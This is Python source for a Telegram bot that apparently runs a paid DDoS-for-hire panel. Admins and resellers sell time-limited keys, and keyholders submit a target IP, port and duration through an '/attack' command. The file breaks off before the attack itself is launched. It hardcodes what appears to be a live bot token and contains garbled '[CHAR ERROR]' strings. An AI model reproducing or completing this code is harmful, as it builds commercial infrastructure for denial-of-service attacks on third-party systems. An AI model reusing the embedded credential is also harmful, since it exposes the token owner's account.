import os
import json
import time
import telebot
import datetime
import subprocess
import threading
import psutil
import pytz
from telebot import types
from dateutil.relativedelta import relativedelta
from filelock import FileLock
from collections import defaultdict

# Bot setup
bot = telebot.TeleBot('7808978161:AAG0aidajxaCci9wSVqX6yTIqMBg9vVJIis', parse_mode='Markdown', threaded=True)
permanent_admins = {"6258297180", "1807014348"}  # @rahul_618, @sadiq9869
admin_id = permanent_admins.copy()  # Dynamic admin list
try:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
except NameError:
    BASE_DIR = os.getcwd()
USER_FILE = os.path.join(BASE_DIR, "users.json")
LOG_FILE = os.path.join(BASE_DIR, "log.txt")
KEY_FILE = os.path.join(BASE_DIR, "keys.json")
RESELLERS_FILE = os.path.join(BASE_DIR, "resellers.json")
LAST_ATTACK_FILE = os.path.join(BASE_DIR, "last_attack.json")
ADMINS_FILE = os.path.join(BASE_DIR, "admins.json")
RULES_FILE = os.path.join(BASE_DIR, "rules.json")
ALLOWED_GROUPS_FILE = os.path.join(BASE_DIR, "allowed_groups.json")
KEY_COST_PER_HOUR = 10
COOLDOWN_PERIOD = 60
RATE_LIMIT = 5  # 5 commands per minute
RATE_LIMIT_WINDOW = 60  # 1 minute

# In-memory storage
users, keys, last_attack_time, resellers, rules, allowed_groups = {}, {}, {}, {}, [], {}
ongoing_attacks = {}  # Track ongoing attacks
command_timestamps = defaultdict(list)  # Track command rate limiting

def load_data():
    global users, keys, last_attack_time, resellers, admin_id, rules, allowed_groups
    users = read_json(USER_FILE, {})
    keys = read_json(KEY_FILE, {})
    last_attack_time = {k: datetime.datetime.fromisoformat(v).replace(tzinfo=pytz.UTC) for k, v in read_json(LAST_ATTACK_FILE, {}).items()}
    resellers = read_json(RESELLERS_FILE, {})
    admin_data = read_json(ADMINS_FILE, {})
    admin_id = permanent_admins | set(admin_data.get("dynamic_admins", []))
    rules = read_json(RULES_FILE, [
        "One time only one attack not do multiple attack same time and if there is cooldown please wait to finish the cooldown",
        "Do not spam in dm owner",
        "Do not spam the bot",
        "Only use the bot in the allowed group",
        "Do not share your keys with others",
        "Follow the instructions carefully",
        "Respect other users and the bot owner",
        "Any violation of these rules will result key ban with no refund"
    ])
    allowed_groups = read_json(ALLOWED_GROUPS_FILE, {})

def read_json(file_path, default):
    try:
        with FileLock(file_path + ".lock"):
            with open(file_path, "r") as f:
                return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError, PermissionError):
        return default

def save_json(file_path, data):
    with FileLock(file_path + ".lock"):
        with open(file_path, "w") as f:
            json.dump(data, f)

def escape_markdown(text):
    if not text:
        return "No username"
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

def send_response(message, text, markup=None):
    try:
        bot.reply_to(message, text, reply_markup=markup, parse_mode='Markdown')
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Failed to send message: {e}\nResponse: {text}")
        bot.reply_to(message, "Error: Unable to send message due to formatting issues or permissions.", parse_mode=None)

def notify_permanent_admins(message_text):
    for admin in permanent_admins:
        try:
            bot.send_message(admin, message_text, parse_mode='Markdown')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Failed to notify admin {admin}: {e}")

def check_rate_limit(user_id):
    now = datetime.datetime.now(pytz.UTC)
    command_timestamps[user_id] = [t for t in command_timestamps[user_id] if (now - t).total_seconds() < RATE_LIMIT_WINDOW]
    if len(command_timestamps[user_id]) >= RATE_LIMIT:
        return False
    command_timestamps[user_id].append(now)
    return True

def restrict_to_admin(user_id, message):
    if user_id not in admin_id:
        send_response(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return False
    return True

def restrict_to_permanent_admin(user_id, message):
    if user_id not in permanent_admins:
        send_response(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 [CHAR ERROR]_D𝗲𝗻𝗶𝗲𝗱: 𝗣𝗲𝗿𝗺𝗮𝗻𝗲𝗻𝘁 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 (@rahul_618, @sadiq9869)")
        return False
    return True

def restrict_to_authorized(user_id, message):
    chat_id = str(message.chat.id)
    if chat_id not in allowed_groups and message.chat.type != "private":
        send_response(message, "🚫 Yeh bot sirf allowed groups mein kaam karta hai!")
        return False
    if user_id not in users and user_id not in admin_id and user_id not in resellers:
        owner = escape_markdown("@rahul_618")
        send_response(message, f"[X] 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! [X]\n𝗢𝗪𝗡𝗘𝗥: {owner}")
        return False
    return True

def restrict_to_reseller_or_admin(user_id, message):
    if user_id not in admin_id and user_id not in resellers:
        send_response(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻/𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆")
        return False
    return True

def log_chat_type(message):
    chat_type = message.chat.type
    user_id = str(message.chat.id)
    with open(LOG_FILE, "a") as f:
        f.write(f"Chat Type: {chat_type} | UserID: {user_id} | Time: {datetime.datetime.now(pytz.UTC)}\n")

def parse_duration(duration_str):
    try:
        time_part, unit = duration_str.rsplit(" ", 1)
        unit = unit.lower()
        if ":" in time_part:
            hours, minutes = map(int, time_part.split(":"))
            total_minutes = hours * 60 + minutes
            return total_minutes / 60  # Convert to hours
        else:
            num = int(time_part)
            if unit in ["hour", "hours"]:
                return num
            elif unit in ["minute", "minutes"]:
                return num / 60
            elif unit in ["day", "days"]:
                return num * 24
            elif unit in ["month", "months"]:
                return num * 30 * 24
            return 0
    except (ValueError, AttributeError):
        return None

def add_time_to_current_date(hours=0):
    return datetime.datetime.now(pytz.UTC) + relativedelta(hours=hours)

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username or f"UserID: {user_id}"
    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log = f"UserID: {user_id} | Time: {datetime.datetime.now(pytz.UTC)} | Command: {command}"
    if target:
        log += f" | Target: {target}"
    if port:
        log += f" | Port: {port}"
    if time:
        log += f" | Time: {time}"
    with open(LOG_FILE, "a") as f:
        f.write(log + "\n")

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add("🚀 Attack", "👤 My Info", "🎟️ Redeem Key", "📜 Check Rules")
    send_response(message, "🌌 *WELCOME TO COSMIC OMNIPOTENT PANEL!* 🌌\nChal, cosmos ko rule karte hain! 💫", markup)

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    help_text = """
🌌 *COSMIC OMNIPOTENT PANEL* 🌌
━━━━━━━━━━━━━━━━━━━━━━━
⚡️ *PERMISSIONS* ⚡️
👤 *Users*: /start, /help, /attack, 🎟️ Redeem Key, 📜 Check Rules
🤝 *Resellers*: /start, /help, /genkey, /balance, /attack, 🎟️ Redeem Key, 📜 Check Rules
👑 *Admins*: Sab commands, no restrictions
🌟 *Permanent Admins* (@rahul_618, @sadiq9869): All commands + /addadmin, /removeadmin, /addrule, /removerule

⚡️ *ADMIN PRIVILEGES* ⚡️
✅ Unlimited access to sab commands
✅ No cooldowns ya balance checks

🛠 *BOT CONTROLS:*
🚀 `/start` - Cosmic interface launch karo
📖 `/help` - Yeh epic guide dekho
📜 `/checkrule` - Bot ke rules dekho

⚙ *MANAGEMENT:*
👑 `/addadmin <user_id>` - Naya admin add karo (Sirf Permanent Admins)
🗑 `/removeadmin <user_id>` - Admin hatao (Sirf Permanent Admins)
📜 `/addrule <rule>` - Naya rule add karo (Sirf Permanent Admins)
🗑 `/removerule <index>` - Rule hatao (Sirf Permanent Admins)
🏦 `/add_reseller <user_id> <balance>` - Reseller add karo
🔑 `/genkey <duration> [<devices>] <keyname>` - Key generate karo (e.g., 300days [2] sadiq, devices sirf Permanent Admins)
🚫 `/block key <keyname>` - Key expire/block karo
🔍 `/allkeys` - Sab keys dekho
📜 `/logs` - Cosmic logs dekho
👥 `/users` - Authorized users dekho
❌ `/remove <user_id>` - User hatao
🎖 `/resellers` - Resellers dekho
💰 `/addbalance <reseller_id> <amount>` - Reseller ko balance add karo
🗑 `/remove_reseller <reseller_id>` - Reseller hatao

💥 *ATTACK CONTROLS:*
🚀 `🚀 Attack` - Cosmic strike launch karo
👤 `👤 My Info` - Apne stats dekho
🎟 `🎟️ Redeem Key` - Key redeem karo
📜 `📜 Check Rules` - Rules ka pallan karo

📋 *EXAMPLE COMMANDS:*
`/genkey 300days sadiq` - 300-day key banaye (Rahul-sadiq)
`/genkey 300days 2 sadiq` - 300-day key 2 devices ke liye (Permanent Admins only)
`/block key sadiq` - Key block karo
`/addrule No begging for free keys` - Naya rule add karo
`/checkrule` - Rules dekho
━━━━━━━━━━━━━━━━━━━━━━━
👑 *Cosmos ko rule karo, boss!* 💫
"""
    send_response(message, help_text)

@bot.message_handler(commands=['checkrule'])
def check_rules(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not rules:
        send_response(message, "⚠️ Koi rules nahi hain abhi!")
        return
    response = "📜 *COSMIC RULES* 📜\n\n"
    for i, rule in enumerate(rules, 1):
        response += f"{i}. {escape_markdown(rule)}\n"
    response += (
        "\n🚨 *BSDK RULES FOLLOW Karna WARNA GND MAR DUNGA* 🚨\n"
        "👑 *Bot Owner*: @rahul_618\n"
        "💬 *Need a key? DM*: @rahul_618\n"
    )
    send_response(message, response)

@bot.message_handler(commands=['addrule'])
def add_rule(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_permanent_admin(user_id, message):
        return
    cmd = message.text.split(maxsplit=1)
    if len(cmd) != 2:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗿𝘂𝗹𝗲 <𝗿𝘂𝗹𝗲>")
        return
    new_rule = cmd[1]
    rules.append(new_rule)
    save_json(RULES_FILE, rules)
    send_response(message, f"✅ *Naya Rule Add Ho Gaya!* ✅\nRule: {escape_markdown(new_rule)}")

@bot.message_handler(commands=['removerule'])
def remove_rule(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_permanent_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "[CHAR ERROR]_U𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲𝗿𝘂𝗹𝗲 <𝗶𝗻𝗱𝗲𝘅>")
        return
    try:
        index = int(cmd[1]) - 1
        if 0 <= index < len(rules):
            removed_rule = rules.pop(index)
            save_json(RULES_FILE, rules)
            send_response(message, f"✅ *Rule Hata Diya!* ✅\nRule: {escape_markdown(removed_rule)}")
        else:
            send_response(message, "❗️ Invalid rule index!")
    except ValueError:
        send_response(message, "❗️ Index must be a number!")

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_permanent_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗮𝗱𝗺𝗶𝗻 <𝘂𝘀𝗲𝗿_𝗶𝗱>")
        return
    new_admin_id = cmd[1]
    if new_admin_id in admin_id:
        send_response(message, f"❗️ 𝗨𝘀𝗲𝗿 {new_admin_id} 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻")
        return
    admin_id.add(new_admin_id)
    save_json(ADMINS_FILE, {"dynamic_admins": list(admin_id - permanent_admins)})
    send_response(message, f"✅ 𝗔𝗱𝗺𝗶𝗻 𝗮𝗱𝗱𝗲𝗱 ✅\n𝗔𝗱𝗺𝗶𝗻 𝗜𝗗: {new_admin_id}")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_permanent_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲𝗮𝗱𝗺𝗶𝗻 <𝘂𝘀𝗲𝗿_𝗶𝗱>")
        return
    target_admin_id = cmd[1]
    if target_admin_id in permanent_admins:
        send_response(message, "❗️ 𝗖𝗮𝗻𝗻𝗼𝘁 𝗿𝗲𝗺𝗼𝘃𝗲 𝗣𝗲𝗿𝗺𝗮𝗻𝗲𝗻𝘁 𝗔𝗱𝗺𝗶𝗻 (@rahul_618, @sadiq9869)")
        return
    if target_admin_id not in admin_id:
        send_response(message, f"❗️ 𝗨𝘀𝗲𝗿 {target_admin_id} 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻")
        return
    admin_id.remove(target_admin_id)
    save_json(ADMINS_FILE, {"dynamic_admins": list(admin_id - permanent_admins)})
    send_response(message, f"✅ 𝗔𝗱𝗺𝗶𝗻 {target_admin_id} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱")

@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 3:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱_𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗯𝗮𝗹𝗮𝗻𝗰𝗲>")
        return
    reseller_id, balance = cmd[1], int(cmd[2])
    if reseller_id in resellers:
        send_response(message, f"❗️𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗹[CHAR ERROR]_r𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀")
        return
    resellers[reseller_id] = balance
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗮𝗱𝗱𝗲𝗱 ✅\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗: {reseller_id}\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} Rs")

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_reseller_or_admin(user_id, message):
        return
    cmd = message.text.split(maxsplit=3)
    if user_id in permanent_admins:
        if len(cmd) != 4:
            send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻> <𝗱𝗲𝘃𝗶𝗰𝗲𝘀> <𝗸𝗲𝘆𝗻𝗮𝗺𝗲> (e.g., /genkey 300days 2 sadiq)")
            return
        duration_str, devices, keyname = cmd[1], cmd[2], cmd[3]
        try:
            devices = int(devices)
            if devices < 1:
                raise ValueError
        except ValueError:
            send_response(message, "❗️ Devices must be a positive number!")
            return
    else:
        if len(cmd) != 3:
            send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂[CHAR ERROR]_r𝗮𝘁𝗶𝗼𝗻> <𝗸𝗲𝘆𝗻𝗮𝗺𝗲> (e.g., /genkey 300days sadiq)")
            return
        duration_str, keyname = cmd[1], cmd[2]
        devices = 1  # Default for non-permanent admins
    duration_hours = parse_duration(duration_str)
    if duration_hours is None:
        send_response(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: <number> hours/days/months, <number>:<number> hours")
        return
    cost = int(duration_hours * KEY_COST_PER_HOUR) or KEY_COST_PER_HOUR
    if user_id in resellers and user_id not in admin_id:
        if resellers[user_id] < cost:
            send_response(message, f"❗️𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲\n𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱: {cost} Rs\n𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲: {resellers[user_id]} Rs")
            return
        resellers[user_id] -= cost
        save_json(RESELLERS_FILE, resellers)
    key = f"Rahul-{keyname}"
    if key in keys:
        send_response(message, f"❗️ 𝗞𝗲𝘆 {escape_markdown(key)} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀! Try a different keyname.")
        return
    expiration = add_time_to_current_date(hours=duration_hours)
    keys[key] = {
        "duration": duration_str,
        "keyname": keyname,
        "creator_id": user_id,
        "expiration_time": expiration.strftime('%Y-%m-%d %H:%M:%S'),
        "created_at": datetime.datetime.now(pytz.UTC).strftime('%Y-%m-%d %H:%M:%S'),
        "devices": devices,
        "used_by": []  # Track devices (user IDs)
    }
    save_json(KEY_FILE, keys)
    creator_info = bot.get_chat(user_id)
    creator_name = escape_markdown(creator_info.username or creator_info.first_name or "Unknown")
    response = (
        f"✅ *Key Ban Gaya, Boss!* ✅\n"
        f"🔑 [CHAR ERROR]_K𝗲𝘆: `{key}`\n"
        f"⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration_str}\n"
        f"📛 𝗞𝗲𝘆𝗻𝗮𝗺𝗲: {escape_markdown(keyname)}\n"
        f"📱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀: {devices}\n"
        f"👤 𝗖𝗿𝗲𝗮𝘁𝗼𝗿: @{creator_name} (ID: {user_id})\n"
        f"📅 𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {keys[key]['expiration_time']}\n"
    )
    if user_id in resellers and user_id not in admin_id:
        response += f"💰 𝗖𝗼𝘀𝘁: {cost} Rs\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[user_id]} Rs"
    send_response(message, response)

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split(maxsplit=2)
    if len(cmd) < 3 or cmd[1].lower() != "key":
        send_response(message, "[CHAR ERROR]_U𝘀𝗮𝗴𝗲: /𝗯𝗹𝗼𝗰𝗸 𝗸𝗲𝘆 <𝗸𝗲𝘆𝗻𝗮𝗺𝗲>")
        return
    keyname = cmd[2]
    target_key = f"Rahul-{keyname}"
    if target_key not in keys:
        send_response(message, f"❗️ [CHAR ERROR]_K𝗲𝘆𝗻𝗮𝗺𝗲 {escape_markdown(keyname)} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
        return
    del keys[target_key]
    save_json(KEY_FILE, keys)
    send_response(message, f"✅ [CHAR ERROR]_K𝗲𝘆 {escape_markdown(keyname)} 𝗯𝗹𝗼𝗰𝗸𝗲𝗱/𝗲𝘅𝗽𝗶𝗿𝗲𝗱")

@bot.message_handler(commands=['allkeys'])
def list_all_keys(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    if not keys:
        send_response(message, "⚠️ 𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗸𝗲𝘆𝘀 𝗳𝗼𝘂𝗻𝗱")
        return
    response = "🔑 *All Active Keys* 🔑\n\n"
    for key, data in keys.items():
        creator_info = bot.get_chat(data["creator_id"])
        creator_name = escape_markdown(creator_info.username or creator_info.first_name or "Unknown")
        response += (
            f"🔑 [CHAR ERROR]_K𝗲𝘆: `{key}`\n"
            f"⏳ [CHAR ERROR]_D𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {data['duration']}\n"
            f"📛 [CHAR ERROR]_K𝗲𝘆𝗻𝗮𝗺𝗲: {escape_markdown(data['keyname'])}\n"
            f"📱 [CHAR ERROR]_D𝗲𝘃𝗶𝗰𝗲𝘀: {data['devices']} (Used: {len(data['used_by'])})\n"
            f"👤 [CHAR ERROR]_C𝗿𝗲𝗮𝘁𝗼𝗿: @{creator_name} (ID: {data['creator_id']})\n"
            f"📅 [CHAR ERROR]_C𝗿𝗲𝗮𝘁𝗲𝗱: {data['created_at']}\n"
            f"📅 [CHAR ERROR]_E𝘅𝗽𝗶𝗿𝗲𝘀: {data['expiration_time']}\n\n"
        )
    send_response(message, response)

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_reseller_or_admin(user_id, message):
        return
    if user_id in resellers:
        send_response(message, f"💰 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[user_id]} Rs")
    else:
        send_response(message, "⚠️ 𝗡𝗼 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 (𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆)")

@bot.message_handler(func=lambda m: m.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    send_response(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂[CHAR ERROR]_r 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    key = message.text.strip()
    if key not in keys:
        send_response(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼[CHAR ERROR]_r 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")
        return
    key_data = keys[key]
    expiration_time = datetime.datetime.strptime(key_data["expiration_time"], '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.UTC)
    if datetime.datetime.now(pytz.UTC) > expiration_time:
        del keys[key]
        save_json(KEY_FILE, keys)
        send_response(message, "📛 [CHAR ERROR]_K𝗲𝘆 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 📛")
        return
    if user_id in key_data["used_by"]:
        send_response(message, "❕𝗬𝗼𝘂 𝗮𝗹[CHAR ERROR]_r𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀 𝘄𝗶𝘁𝗵 𝘁𝗵𝗶𝘀 𝗸𝗲𝘆❕")
        return
    if len(key_data["used_by"]) >= key_data["devices"]:
        send_response(message, "🚫 *Key device limit reached!* 🚫\nYeh key already max devices pe use ho chuka hai!")
        notify_permanent_admins(
            f"🚨 *Key Device Limit Violation* 🚨\n"
            f"Key: `{key}`\n"
            f"Keyname: {escape_markdown(key_data['keyname'])}\n"
            f"UserID: {user_id}\n"
            f"Time: {datetime.datetime.now(pytz.UTC)}"
        )
        return
    key_data["used_by"].append(user_id)
    users[user_id] = key_data["expiration_time"]
    save_json(KEY_FILE, keys)
    save_json(USER_FILE, users)
    if len(key_data["used_by"]) == key_data["devices"]:
        del keys[key]
        save_json(KEY_FILE, keys)
    send_response(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱!\n𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {users[user_id]}")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_admin(user_id, message):
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        except FileNotFoundError:
            send_response(message, "No data found")
        except telebot.apihelper.ApiTelegramException:
            send_response(message, "Error: Unable to send log file due to permissions or size limits.")
    else:
        send_response(message, "No data found")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_authorized(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 4:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝘁𝘁𝗮𝗰𝗸 <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>")
        return
    process_attack_details(message, cmd[1:])

@bot.message_handler(func=lambda m: m.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if not restrict_to_authorized(user_id, message):
        return
    if user_id in ongoing_attacks:
        send_response(message, "🚫 Ek time pe ek hi attack, bhai! Ongoing attack khatam hone de!")
        return
    if user_id not in admin_id:  # Admins bypass expiration and cooldown
        expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.UTC)
        if datetime.datetime.now(pytz.UTC) > expiration:
            send_response(message, "❗️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 ❗️")
            return
        if user_id in last_attack_time:
            if (datetime.datetime.now(pytz.UTC) - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
                remaining = COOLDOWN_PERIOD - (datetime.datetime.now(pytz.UTC) - last_attack_time[user_id]).total_seconds()
                send_response(message, f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 𝗪𝗮𝗶𝘁 {int(remaining)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
                return
    send_response(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗮𝗿𝗴[CHAR ERROR]_e𝘁 𝗶𝗽, 𝗽𝗼[CHAR ERROR]_r𝘁, 𝘁𝗶𝗺𝗲 (𝘀𝗲𝗰𝗼𝗻𝗱𝘀) 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲")
    bot.register_next_step_handler(message, process_attack_details)

def process_attack_details(message, details=None):
    user_id = str(message.chat.id)
    log_chat_type(message)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk!")
        return
    if user_id in ongoing_attacks:
        send_response(message, "🚫 Ek time pe ek hi attack, bhai! Ongoing attack khatam hone de!")
        return
    details = details or message.text.split()
    if len(details) != 3:
        send_response(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲")
        return
    target, port, time = details
    try:
        port = int(port)
        time = int(time)
        if not 1 <= port <= 65535:
            raise ValueError
        if time > 300:
            send_response(message, "𝗘𝗿𝗿𝗼𝗿: 𝗧𝗶𝗺𝗲 𝗺𝘂𝘀𝘁 𝗯𝗲 ≤ 300 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
            return
    except ValueError:
        send_response(message, "𝗜𝗻𝘃[CHAR ERROR]_a𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼[CHAR ERROR]_r 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁")
        return
    if psutil.cpu_percent() > 80 or psutil.virtual_memory().percent > 80:
